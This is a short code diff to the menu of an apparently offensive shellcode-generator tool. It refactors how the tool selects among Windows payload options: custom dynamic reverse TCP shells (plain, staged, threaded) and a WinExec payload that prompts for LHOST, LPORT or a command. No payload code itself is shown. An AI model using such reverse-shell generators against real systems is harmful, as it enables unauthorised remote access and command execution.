@@ -74,8 +74,9 @@ def menu():
         LibDebug.Log("SUCCESS", shellcodes[int(
             value)] + " successfuly loaded.")
         LibDebug.Log("WORK", "Generating the shellcode..")
+        selection = shellcodes[int(value)].replace("Windows/","")
         try:
-            if shellcodes[int(value)] == "Custom_Dynamic_ReverseTCP_Shell":
+            if selection == "Custom_Dynamic_ReverseTCP_Shell":
                 print("Please enter your " + Color.YELLOW +
                               " LHOST IP " + Color.RESET + " : ", end="")
                 LHOST = input()
@@ -83,11 +84,11 @@ def menu():
                               " LPORT " + Color.RESET + " : ", end="")
                 LPORT = input()
                 shellcode = LibShellcode.GenerateCDRTShell(LHOST, LPORT)
-            elif shellcodes[int(value)] == "Custom_Dynamic_ReverseTCP_Staged":
+            elif selection == "Custom_Dynamic_ReverseTCP_Staged":
                 shellcode = LibShellcode.GenerateCDRTS()
-            elif shellcodes[int(value)] == "Custom_Dynamic_ReverseTCP_Threaded_Shell":
+            elif selection == "Custom_Dynamic_ReverseTCP_Threaded_Shell":
                 shellcode = LibShellcode.GenerateCDRTTShell()
-            elif shellcodes[int(value)] == "Custom_Dynamic_WinExec":
+            elif selection == "Custom_Dynamic_WinExec":
                 print("Please enter your " + Color.YELLOW +
                             " COMMAND " + Color.RESET + " : ", end="")
                 CMD = input()
